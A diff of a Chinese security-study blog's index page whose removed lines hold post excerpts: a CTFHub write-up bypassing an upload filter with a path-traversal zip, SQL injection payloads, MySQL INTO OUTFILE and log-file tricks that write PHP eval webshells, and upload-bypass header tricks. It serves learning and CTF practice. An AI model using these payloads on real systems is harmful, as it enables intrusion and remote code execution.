-&#39;;
-
-    show_source(__FILE__);
-&#125;else&#123;
-    $file = $_FILES[&#39;file&#39;];
-
-    if(!$file)&#123;
-        exit(&quot;请勿上传空文件&quot;);
-    &#125;
-    $name = $file[&#39;name&#39;];
-
-    $dir = &#39;upload/&#39;;
-    $ext = strtolower(substr(strrchr($name, &#39;.&#39;), 1));
-    $path = $dir.$name;
-
-    function check_dir($dir)&#123;
-        $handle = opendir($dir);
-        while(($f = readdir($handle)) !== false)&#123;
-            if(!in_array($f, array(&#39;.&#39;, &#39;..&#39;)))&#123;
-                if(is_dir($dir.$f))&#123;
-                    check_dir($dir.$f.&#39;/&#39;);
-                 &#125;else&#123;
-                    $ext = strtolower(substr(strrchr($f, &#39;.&#39;), 1));
-                    if(!in_array($ext, array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;)))&#123;
-                        unlink($dir.$f);
-                    &#125;
-                &#125;
-            
-            &#125;
-        &#125;
-    &#125;
-
-    if(!is_dir($dir))&#123;
-        mkdir($dir);
-    &#125;
-
-    $temp_dir = $dir.md5(time(). rand(1000,9999));
-    if(!is_dir($temp_dir))&#123;
-        mkdir($temp_dir);
-    &#125;
-
-    if(in_array($ext, array(&#39;zip&#39;, &#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;)))&#123;
-        if($ext == &#39;zip&#39;)&#123;
-            $archive = new PclZip($file[&#39;tmp_name&#39;]);
-            foreach($archive-&gt;listContent() as $value)&#123;
-                $filename = $value[&quot;filename&quot;];
-                if(preg_match(&#39;/\.php$/&#39;, $filename))&#123;
-                     exit(&quot;压缩包内不允许含有php文件!&quot;);
-                 &#125;
-            &#125;
-            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) &#123;
-                   exit(&quot;解压失败&quot;);
-                   check_dir($dir);
-            &#125;
-
-            check_dir($dir);
-            exit(&#39;上传成功!&#39;);
-        &#125;else&#123;
-            move_uploaded_file($file[&#39;tmp_name&#39;], $temp_dir.&#39;/&#39;.$file[&#39;name&#39;]);
-            check_dir($dir);
-            exit(&#39;上传成功!&#39;);
-        &#125;
-    &#125;else&#123;
-        exit(&#39;仅允许上传zip、jpg、gif、png文件!&#39;);
-    &#125;
-&#125;
-</code></pre>
-<p>得知上传限制：</p>
-<p>1.仅允许上传zip、jpg、gif、png文件!</p>
-<p>2.如果上传压缩包，压缩包内不允许含有php文件</p>
-<h3 id="信息收集和代码分析"><a href="#信息收集和代码分析" class="headerlink" title="信息收集和代码分析"></a>信息收集和代码分析</h3><h5 id="限制1"><a href="#限制1" class="headerlink" title="限制1"></a>限制1</h5><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/001.png" alt="001"></p>
-<p>apache存在的多后缀文件解析漏洞，这里上传一个任何不可识别的后缀都行（如：x.php.xxx），都可绕过该正则限制</p>
-<h5 id="限制2"><a href="#限制2" class="headerlink" title="限制2"></a>限制2</h5><pre><code class="php">if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) &#123;
-                   exit(&quot;解压失败&quot;);
-                   check_dir($dir);
-</code></pre>
-<p>接合上面未截出的代码得知，<code>check_dir</code>作用于<code>upload</code>文件夹以下，将解压出的文件穿越到<code>非upload</code>目录，<code>check__dir</code>将无法删除文件</p>
-<pre><code class="php">    $temp_dir = $dir.md5(time(). rand(1000,9999));
-    if(!is_dir($temp_dir))&#123;
-        mkdir($temp_dir);
-    &#125;
-</code></pre>
-<p><code>zip</code>压缩包被解压到<code>/upload/随机md5/</code>目录下，由此可得知手动几乎不可能找到随机的文件夹，需要穿越两个目录</p>
-<h3 id="构造压缩包"><a href="#构造压缩包" class="headerlink" title="构造压缩包"></a>构造压缩包</h3><p>再此之前试过其他绕过方法后行不通，开始尝试使用压缩包来绕过</p>
-<p>将之前的PHP马改成<code>123123123.php.XXX</code>,文件名留够<code>/../../</code>的位置,以便穿越，后缀随便，我<code>jpg</code>是因为之前测试用的，就不改了</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/002.png" alt="002"></p>
-<p>压缩后得左边的压缩包，并把压缩包放入<code>010EditorPortable.exe</code>，修改压缩包内的文件名</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/003.png" alt="003"></p>
-<p>上传测试，右边返回的是（上传成功！）</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/004.png" alt="004"></p>
-<p>到<code>url</code>下获得<code>flag</code>，看见<code>zip</code>解压出来的文件，即绕过成功</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/005.png" alt="005"></p>
-
+    <h3 id="先上题目源码"><a href="#先上题目源码" class="headerlink" title="先上题目源码"></a>先上题目源码</h3><h6 id="如下↓"><a href="#如下↓" class="headerlink" title="如下↓"></a>如下↓</h6>
+    
+    <a class="article-more-a" href="/2022/03/14/CTFHUB%20%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0web%E8%BF%9B%E9%98%B6-Web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E3%80%91/#more">more >></a>
+    
     
 
     
@@ -875,63 +502,12 @@ if(!$_FILES)&#123;
     
     <h1 id="网络安全知识小计-2"><a href="#网络安全知识小计-2" class="headerlink" title="网络安全知识小计-2"></a>网络安全知识小计-2</h1><h3 id="ssrf-利用方法"><a href="#ssrf-利用方法" class="headerlink" title="ssrf 利用方法"></a>ssrf 利用方法</h3><p><strong>ssrf服务端请求伪造，利用web端攻击内网</strong></p>
 <p><strong>常用利用协议</strong></p>
-<pre><code>http://：探测内网主机存活、端口开放情况
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://：探测内网主机存活、端口开放情况</span><br><span class="line"></span><br><span class="line">gopher://：发送GET或POST请求；攻击内网应用，如FastCGI、Redis</span><br><span class="line"></span><br><span class="line">dict://：泄露安装软件版本信息，查看端口，操作内网redis访问等</span><br><span class="line"></span><br><span class="line">file://：读取本地文件</span><br></pre></td></tr></table></figure>
 
-gopher://：发送GET或POST请求；攻击内网应用，如FastCGI、Redis
-
-dict://：泄露安装软件版本信息，查看端口，操作内网redis访问等
-
-file://：读取本地文件
-</code></pre>
-<h3 id="何处可能存在SSRF漏洞"><a href="#何处可能存在SSRF漏洞" class="headerlink" title="何处可能存在SSRF漏洞"></a>何处可能存在SSRF漏洞</h3><p>能够对外发起网络请求的地方，就可能存在SSRF漏洞<br>从远程服务器请求资源(Upload from URL，Import &amp; Export RSS Feed)<br>数据库内置功能(Oracle、 MongoDB、MSSQL、 Postgres、 CouchDB)<br>Webmail收取其他邮箱邮件(POP3、 IMAP、SMTP)<br>文件处理、编码处理、属性信息处理(ffmpeg、 ImageMagic、 DOCX、 PDF、 XML)</p>
-<h3 id="如何突破延时盲注的时间"><a href="#如何突破延时盲注的时间" class="headerlink" title="如何突破延时盲注的时间"></a>如何突破延时盲注的时间</h3><p>利用<strong>dns注入</strong>快速获取数据，使用sqlmap结合dnslog</p>
-<h3 id="内网确定域控"><a href="#内网确定域控" class="headerlink" title="内网确定域控"></a>内网确定域控</h3><p>判断是否在域中</p>
-<pre><code>ipconfig /all
-systeminfo
-net config workstation
-</code></pre>
-<p>定位域控</p>
-<pre><code>nslookup test.com
-nslookup -type=SRV _ldap._tcp
-</code></pre>
-<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><p>1.对文件的内容，数据。数据包进行处理</p>
-<p>2.通过替换大小写来进行绕过</p>
-<p>3.通过删减空格来进行绕过</p>
-<p>4.通过字符串拼接绕过</p>
-<pre><code>看Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh3.php&quot;
-将 form-data 修改为   f+orm-data
-将 form-data 修改为   form-d+ata
-</code></pre>
-<p>5.双文件上传绕过</p>
-<p>6.HTTP header 属性值绕过</p>
-<pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;
-我们通过替换form-data 为*来绕过
-Content-Disposition: *; name=&quot;file&quot;; filename=&quot;yjh.php&quot;
-</code></pre>
-<p>7.HTTP header 属性名称绕过</p>
-<pre><code>源代码:
-Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png
-绕过内容如下：
-Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png
-C.php&quot;
-删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php&quot;.
-</code></pre>
-<p>8.等效替换绕过</p>
-<pre><code>原内容：
-Content-Type: multipart/form-data; boundary=---------------------------471463142114
-修改后:
-Content-Type: multipart/form-data; boundary =---------------------------471463142114
-boundary后面加入空格。
-</code></pre>
-<p>9.修改编码绕过</p>
-<pre><code>使用UTF-16、Unicode、双URL编码等等
-</code></pre>
-<h3 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h3><p>就是用<code>into outfile</code>函数将一个可以用来上传的php文件写到网站的根目录下，然后利用<code>tmpukjhb.php</code>上传了一个<code>tmpbezal.php</code>的文件，<code>tmpbezal.php</code>这个文件可以用来执行系统命令，并且将结果返回出来</p>
-<p><strong>os-shell的执行条件有三个</strong></p>
-<p>（1）网站必须是root权限</p>
-<p>（2）攻击者需要知道网站的绝对路径</p>
-<p>（3）GPC为off，php主动转义的功能关闭</p>
-
+<h3 id="何处可能存在SSRF漏洞"><a href="#何处可能存在SSRF漏洞" class="headerlink" title="何处可能存在SSRF漏洞"></a>何处可能存在SSRF漏洞</h3>
+    
+    <a class="article-more-a" href="/2022/03/14/%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%B02/#more">more >></a>
+    
     
 
     
@@ -1009,28 +585,9 @@ boundary后面加入空格。
 <p>2.证明证据无损 （hash）</p>
 <p>hash技术是证明无损的主要方法</p>
 <p>每一步都要进行hash运算，以便与原磁盘文件做对比，确保无损。</p>
-<h3 id="电子取证和数字取证的区别"><a href="#电子取证和数字取证的区别" class="headerlink" title="电子取证和数字取证的区别"></a>电子取证和数字取证的区别</h3><p><b>电子取证针</b>对电子数据，电子数据含模拟和数字两类</p>
-<p><strong>数字取证针</strong>对数字数据，计算机取证针对计算机产生的数字数据</p>
-<p>电子取证范围最大，计算机取证范围最小</p>
-<p>计算机取证分为：司法取证和企业内部取证</p>
-<h3 id="数字图像篡改的六种主要方法"><a href="#数字图像篡改的六种主要方法" class="headerlink" title="数字图像篡改的六种主要方法"></a>数字图像篡改的六种主要方法</h3><p>（1）合成（2）图像局部信息修改（3）润饰</p>
-<p>（4）变形技术（5）计算机图形学技术（6）绘画</p>
-<h3 id="数字媒体防伪认证的方法"><a href="#数字媒体防伪认证的方法" class="headerlink" title="数字媒体防伪认证的方法"></a>数字媒体防伪认证的方法</h3><p>1.主动认证：水印认证、数字签名认证（鲁棒HASH认证）</p>
-<p>2.被动认证</p>
-<h3 id="网络取证的概念"><a href="#网络取证的概念" class="headerlink" title="网络取证的概念"></a>网络取证的概念</h3><p>网络取证则不同，其主要针对的是计算机网络，调查的重点在于各种网络设备（服务器、路由器、防火墙、入侵检测系统等），也即主要是通过对各种网络行为的调查和分析，从而获取与案件相关的证据。</p>
-<h3 id="比如网络取证，我们要调查核心交换机"><a href="#比如网络取证，我们要调查核心交换机" class="headerlink" title="比如网络取证，我们要调查核心交换机"></a>比如网络取证，我们要调查核心交换机</h3><p>主要查 <strong><code>日志</code></strong></p>
-<p>我国网络安全法明确规定，重要信息系统，日志至少保存6个月</p>
-<h3 id="申请计算机搜查的基本条件是什么？"><a href="#申请计算机搜查的基本条件是什么？" class="headerlink" title="申请计算机搜查的基本条件是什么？"></a>申请计算机搜查的基本条件是什么？</h3><p>1.理由正当</p>
-<p>2.找对的人审批</p>
-<p>3.仔细确定审批范围（最重要，确定后不能更改）</p>
-<h3 id="申请计算机搜查的基本条件"><a href="#申请计算机搜查的基本条件" class="headerlink" title="申请计算机搜查的基本条件"></a>申请计算机搜查的基本条件</h3><p>（1）合法取证</p>
-<p><code>*四要素：主体、对象、过程、手段（对于主体和对象合法，主要是依靠我们的授权，                     企业内部取证调查就要靠取证授权）*</code></p>
-<p>（2）无损取证</p>
-<p>（3）全面取证</p>
-<p>（4）及时取证</p>
-<h3 id="计算机取证的实施过程有哪些关键阶段？"><a href="#计算机取证的实施过程有哪些关键阶段？" class="headerlink" title="计算机取证的实施过程有哪些关键阶段？"></a>计算机取证的实施过程有哪些关键阶段？</h3><p>案件受理、取证准备、处理现场、搜集证据、固定证据、</p>
-<p>证据保存、证据分析、报告生成、证据归档和证据显示与质证</p>
-
+    
+    <a class="article-more-a" href="/2022/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81%E4%B8%8E%E5%8F%B8%E6%B3%95%E9%89%B4%E5%AE%9A%E5%B0%8F%E8%AE%A1-1/#more">more >></a>
+    
     
 
     
@@ -1106,23 +663,9 @@ boundary后面加入空格。
     
     <h1 id="CTFHUB-SQL注入-2思维小计"><a href="#CTFHUB-SQL注入-2思维小计" class="headerlink" title="CTFHUB-SQL注入-2思维小计"></a>CTFHUB-SQL注入-2思维小计</h1><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
 <p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
-<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
-<p>![1](E:...          This is Uknow—JJ\A一些小记录\notes\博客图片\1.png)</p>
-<p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/2.png" alt="2"></p>
-<p>4.用updatexml函数进行报错返回值<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/3.png" alt="3"></p>
-<p>构建语句发现只返回了一个~</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/4.png" alt="4"></p>
-<p>发现中间这个值才会被返回<br><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/5.png" alt="5"></p>
-<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/6.png" alt="6"></p>
-<p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
-<p>构造语句</p>
-<p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
-<p>原因：<code>select</code>被过滤双关键字绕过 selselectect</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&amp;pass=xxxx</code></p>
-
+    
+    <a class="article-more-a" href="/2022/03/02/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/#more">more >></a>
+    
     
 
     
@@ -1199,42 +742,9 @@ boundary后面加入空格。
     <h1 id="网络安全知识小计-1"><a href="#网络安全知识小计-1" class="headerlink" title="网络安全知识小计-1"></a>网络安全知识小计-1</h1><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><p>MOF提权：<code>nullevt.mot</code>每分钟执行一次，写入CMD命令，则会执行</p>
 <p>UDF提权： 调用自定义函数</p>
 <p>启动项提权： 用 MySQL 将自定义脚本导入到启动项中</p>
-<h3 id="IPS-x2F-IDS-x2F-HIDS"><a href="#IPS-x2F-IDS-x2F-HIDS" class="headerlink" title="IPS&#x2F;IDS&#x2F;HIDS"></a>IPS&#x2F;IDS&#x2F;HIDS</h3><p><code>IDS</code> 入侵检测系统 <code>HIDS</code>基于主机，检测文件和应急响应等<br><code>IPS</code> 入侵防御系统</p>
-<h3 id="linux、windows命令：过滤文件、查看进程环境变量"><a href="#linux、windows命令：过滤文件、查看进程环境变量" class="headerlink" title="linux、windows命令：过滤文件、查看进程环境变量"></a>linux、windows命令：过滤文件、查看进程环境变量</h3><p>linux：第一步：获取进程pid<br>​ <code>ps -ef | grep 进程名</code><br>​ 第二部：<code>cat /proc/pid(进程ID)/environ</code><br>​ 输出进程环境变量</p>
-<p>win：查看 <code>set path</code></p>
-<p>添加 <code>set 变量名=变量内容</code></p>
-<h3 id="WAF及其绕过方式"><a href="#WAF及其绕过方式" class="headerlink" title="WAF及其绕过方式"></a>WAF及其绕过方式</h3><p>WAF特性、脏字符（大小写，注释符，编码绕过等）</p>
-<h3 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h3><p>shiro提供<code>rememberme</code>这个功能，会生成一个进行序列化的<code>cookie</code>，下次登陆可以通过识别<code>cookie</code>登陆。获取<code>cookie</code>后构造恶意代码，加密后作为<code>cookie</code>发送，服务端接收后出发反序列化漏洞</p>
-<h3 id="Sql注入的分类"><a href="#Sql注入的分类" class="headerlink" title="Sql注入的分类"></a>Sql注入的分类</h3><p>布尔盲注：只能从应用返回中推断语句执行后的布尔值</p>
-<p>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</p>
-<p>报错注入：应用会显示全部或者部分的报错信息</p>
-<p>堆叠注入：加入 ; 后一次执行多条语句</p>
-<p>还有 宽字节注入、base64注入、cookie注入、XFF注入</p>
-<h3 id="Mysql如何getshell"><a href="#Mysql如何getshell" class="headerlink" title="Mysql如何getshell"></a>Mysql如何getshell</h3><p>（1）利用into outfile写入木马文件</p>
-<pre><code>select &quot;&lt;?php eval@($_POST[&#39;cmd&#39;]);?&gt;into outfile &quot;D&quot;\\xxx\\xxx\\xxx
-</code></pre>
-<p>（2）利用日志文件写入木马</p>
-<p>1.开启日志功能</p>
-<pre><code>set global slow_query_log=1;
-</code></pre>
-<p>2.设置日志存储路径</p>
-<pre><code>set global slow_query_log_file=&#39;D:\\xx\\xx&#39;;
-</code></pre>
-<p>3.执行sql语句</p>
-<pre><code>select &#39;&lt;?php @eval($_GET[H])?&gt;&#39; or SLEEP(11);
-</code></pre>
-<h3 id="Xss分类"><a href="#Xss分类" class="headerlink" title="Xss分类"></a>Xss分类</h3><p>存储：储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p>
-<p>Dom：一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生</p>
-<p>反射：反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发</p>
-<p>CSRF：跨站点请求伪造，基于xss，冒充用户发起请求</p>
-<p>SSRF：服务端请求伪造</p>
-<p>XEE：在应用程序解读XML时，允许引入外部实体，就可以构造恶意内容，造成读取恶意文件，代码执行，端口探测….</p>
-<h3 id="文件上传、文件包含、目录遍历"><a href="#文件上传、文件包含、目录遍历" class="headerlink" title="文件上传、文件包含、目录遍历"></a>文件上传、文件包含、目录遍历</h3><p>文件上传：利用文件上传功能上传可执行脚本文件，文件上传还可能导致其他问题，比如上传超大文件造成占用带宽占满磁盘等</p>
-<p>文件包含：<code>includ,require</code>等函数可以加载远程文件，如果没有进行过滤，则执行文件的恶意代码</p>
-<p>目录遍历：搜索包含<code>index of</code>标题的网页，网站目录可以被任意浏览</p>
-<p>任意文件读取&#x2F;下载： 将文件变量改成<code>../../etc/passwd</code>等形式，下载预期外文件的漏洞</p>
-<h3 id="栈溢出攻击"><a href="#栈溢出攻击" class="headerlink" title="栈溢出攻击"></a>栈溢出攻击</h3><p>向缓冲区填入大量输出，造成溢出。利用缓冲区溢出改写代码，改变程序执行流程，执行<code>shellcode</code></p>
-
+    
+    <a class="article-more-a" href="/2022/02/22/%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%B0/#more">more >></a>
+    
     
 
     
@@ -1308,30 +818,14 @@ boundary后面加入空格。
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="布尔盲注某payload拆解分析"><a href="#布尔盲注某payload拆解分析" class="headerlink" title="布尔盲注某payload拆解分析"></a>布尔盲注某payload拆解分析</h1><p>学习的时候为了理解写的小水文，如果写的不好，望理解，嘿嘿~🤭</p>
+    <h1 id="布尔盲注某payload拆解分析"><a href="#布尔盲注某payload拆解分析" class="headerlink" title="布尔盲注某payload拆解分析"></a>布尔盲注某payload拆解分析</h1><p>小水文，若写的不好，望理解，嘿嘿~🤭</p>
 <h3 id="重点函数"><a href="#重点函数" class="headerlink" title="重点函数"></a>重点函数</h3><p><code>ord()</code> 转换成ASCII码</p>
 <p><code>mid(string，n，1)</code> AND <code>substr(string，n，1)</code> 截取字符串第n位</p>
 <p><code>left(sting，n)</code> 截取字符串的前n位</p>
-<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>异或</p>
-<pre><code>[`查表`]
-1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())), 1,1))&gt;0)^1
-
-[`查列`]
-1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)), 1,1))&gt;0)^1`
-
-[`查数据`]
-1^(ord(substr((select(group_concat(flag,value))from(flag)), 1,1))&gt;0)^1
-</code></pre>
-<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><code>group_concat()</code>  可以组合多个字符串</p>
-<p><code>information_schema.tables</code> 查表</p>
-<p><code>information_schema.columns</code> 查列</p>
-<p><code>substr(sql语句返回的值,n,1) </code> 截取字符串，查看数据库库名的第n位，字长为1</p>
-<p><code>ord</code> 函数返回[字符串]第一个字符的 ASCII码值。通过ASCII码确定数据库名【<code>ord(mid(查询语句))</code>】</p>
-<h3 id="语句分析"><a href="#语句分析" class="headerlink" title="语句分析"></a>语句分析</h3><p><code>table_name</code> 是表名</p>
-<p><code>table_schema</code> 是库名</p>
-<p><code>information_shcema</code>  可看作为数据库名，表明，数据类型，权限等这些的数据库</p>
-<p>查表：<code>select(group_concat(table_name))from(information_shcema.tables)where(table_schema=databases())</code><br>返回ASCII码：<code>ord(mid(SQL语句查询的表名))</code></p>
-
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3>
+    
+    <a class="article-more-a" href="/2021/12/27/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90%E4%B8%AApayload%E7%9A%84%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/#more">more >></a>
+    
     
 
     
@@ -1408,21 +902,10 @@ boundary后面加入空格。
     <p>如果没有公网IP可以自己创建两个虚拟机测试：</p>
 <p><code>假设CP1 ip：192.168.3.102</code><br><code>假设CP2 ip:192.168.3.0</code></p>
 <p>一、先关闭CP1防火墙吧</p>
-<p><code>systemctl stop firewalld</code><br><code>systemctl disable firewalld</code><br>二、CP1 CP2 都执行：</p>
-<p><code>yum -y install nfs*</code><br><code>yum -y install rpcbind*</code><br>三、在CP1里面：<br>创建共享文件夹 <code>share1</code><br><code>vim /etc/exports</code><br>添加如下命令（自己记得改IP）</p>
-<p><code>/root/share1 192.168.3.0/255.255.255.0(rw,sync,all_squash)</code><br>(修改了此命令记得重新启动一下nfs rpcbind服务，否则不会更新你修改的)</p>
-<p>四、在CP2里面：<br><code>root</code>目录下创建文件夹 <code>share2</code></p>
-<p>五、CP1 CP2 都执行：<br>启动nfs和rpcbind<br>rpc先启动nfs后启动，顺序不对会导致服务器报错</p>
-<p><code>systemctl start rpcbind</code><br><code>systemctl start nfs</code></p>
-<p>设置nfs及rpcbind开机自启</p>
-<p><code>systemctl enable nfs</code><br><code>systemctl enable rpcbind</code></p>
-<p>六、在CP2上执行：<br>可以用status确认<br><code>showmount -e 192.168.3.102</code></p>
-<p>开始挂载：<br><code>mount -t nfs 192.168.3.102:/root/share1 /root/share2</code><br>前面是CP1的文件路径，后面是CP2的文件路径</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220318121404543.png" alt="image-20220318121404543"></p>
-<p><code>df -h</code>查看是否挂在成功</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220318121413877.png" alt="image-20220318121413877"></p>
-<p>注：<br>可以在CP1或CP2下创建文件夹或者创建文件测试一下，若两边主机都可以查看到则成功<br>如果不成功需要赋予权限,CP1执行：<br><code>chown -R nfsnobody:nfsnobody /root/share1</code></p>
-
+<p><code>systemctl stop firewalld</code><br><code>systemctl disable firewalld</code></p>
+    
+    <a class="article-more-a" href="/2021/12/18/Linux%E6%90%AD%E5%BB%BAnfs%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9C%8D%E5%8A%A1/#more">more >></a>
+    
     
 
     
@@ -1481,7 +964,7 @@ boundary后面加入空格。
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2019-2022 <a href="http://什么时候才能去旅行.com/" target="_blank">UknowJJ</a>
+    		&copy; 2019-2022 <a href="http://什么时候才能去旅行.com/" target="_blank">人们不会总是很快明白当前所做的事，直到它变成回忆~🍂</a>
     	</div>
       	<div class="footer-right">
 			
@@ -1536,10 +1019,10 @@ boundary后面加入空格。
   var titleTime;
   document.addEventListener("visibilitychange", function () {
     if (document.hidden) {
-      document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+      document.title = "去哪~ " + originTitle;
       clearTimeout(titleTime);
     } else {
-      document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+      document.title = "嘿，近来可好~" + originTitle;
       titleTime = setTimeout(function () {
         document.title = originTitle;
       }, 2000);
@@ -1557,29 +1040,13 @@ boundary后面加入空格。
       
       
     
-      
-      
-      
-    
-      
-      
-      
-    
     
 
     <ul style="width: 70%">
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
-      
-        
-      
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
-      
-        
-      
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      <li style="width: 100%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">文章目录</a></li>
       
         
     </ul>
@@ -1643,29 +1110,7 @@ boundary后面加入空格。
     
 
     
-    	<section class="tools-section tools-section-friends" q-show="friends">
-  		
-        <ul class="search-ul">
-          
-            <li class="search-li">
-              <a href="https://uknowjj.gitee.io/" target="_blank" 
-                class="search-title" title="交个朋友吧，咱们都很无聊">
-                
-                  <i class="icon-link icon"></i>
-                
-                技术笔记
-              </a>
-            </li>
-          
-        </ul>
-  		
-    	</section>
-    
 
-    
-    	<section class="tools-section tools-section-me" q-show="aboutme">
-        
-    	</section>
     
   </div>
   
@@ -1772,7 +1217,7 @@ boundary后面加入空格。
 <script type="text/javascript" src="/plugins/activate-power-mode/activate-power-mode.js"></script>
 <script>
   POWERMODE.colorful = true; // make power mode colorful
-  POWERMODE.shake = false; // turn off shake
+  POWERMODE.shake = true; // turn off shake
   document.body.addEventListener('input', POWERMODE);
 </script>
 
